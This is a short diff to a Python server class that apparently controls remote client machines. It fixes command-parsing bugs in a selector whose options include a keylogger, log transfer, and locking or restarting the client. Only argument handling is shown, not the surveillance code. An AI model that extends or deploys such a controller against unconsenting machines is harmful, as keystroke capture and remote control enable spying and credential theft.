@@ -619,8 +619,8 @@ class MultiServer(object):
     def selector(self, conn, command) -> bool:
         """ Command selector interface """
         # returns True/None
-        command = command[:3].lower()
         select = command[4:].strip()
+        command = command[:3].lower()
         if '--h' in command:
             print(interface_help)
             return
@@ -666,6 +666,8 @@ class MultiServer(object):
                 else:
                     print('Keylogger ImportError')
                 return
+            print("Invalid Argument: '--h' for help")
+            return
         if '--l' in command:
             print('Transferring log...')
             log = self.get_log(conn)
@@ -728,6 +730,8 @@ class MultiServer(object):
                 else:
                     print(error)
                 return
+            print("Invalid Argument: '--h' for help")
+            return
         if command == '--q':
             if select == '1':
                 if self.lock(conn):
@@ -743,13 +747,17 @@ class MultiServer(object):
                 print('Restarting Client Machine')
                 self.restart(conn)
                 return True
+            print("Invalid Argument: '--h' for help")
+            return
         if command == '--x':
-            if command == '1':
+            if select == '1':
                 print('Restarting Session...')
                 return self.restart_session(conn)
-            elif command == '2':
+            elif select == '2':
                 print('Disconnecting Client...')
                 return self.disconnect(conn)
+            print("Invalid Argument: '--h' for help")
+            return
         if '--b' in command:
             return True
         print("Invalid command: '--h' for help.")
